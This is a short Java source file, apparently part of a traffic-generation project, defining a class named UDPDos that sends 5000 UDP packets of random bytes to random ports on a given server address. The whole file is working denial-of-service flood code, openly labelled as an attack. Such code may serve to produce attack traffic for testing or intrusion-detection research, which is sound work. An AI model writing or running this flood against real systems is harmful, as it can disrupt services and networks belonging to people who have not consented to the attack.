package fr.contacgen;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

public class UDPDos implements Runnable {
	private InetAddress server;
	private int amount = 5000;

	private long seed = 4276498;

	public UDPDos(InetAddress server) {
		this.server = server;
	}

	public UDPDos(InetAddress server, long seed) {
		this.server = server;
		this.seed = seed;
	}

	@Override
	public void run() {
		System.out.println("UDPDOS started on url: " + server);
		Random r = new Random(seed);
		while (amount > 0) {
			if(udpAttack(r)) amount--;
		}
		System.out.println("UDPDOS finished");
	}

	private boolean udpAttack(Random r) {
		int length = r.nextInt(500) + 50;
		byte buffer[] = new byte[length];

		r.nextBytes(buffer);

		int port = r.nextInt(65535) + 1;

		DatagramPacket dataSent = new DatagramPacket(buffer, length, server, port);
		try (DatagramSocket socket = new DatagramSocket()) {
			socket.send(dataSent);
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}

}
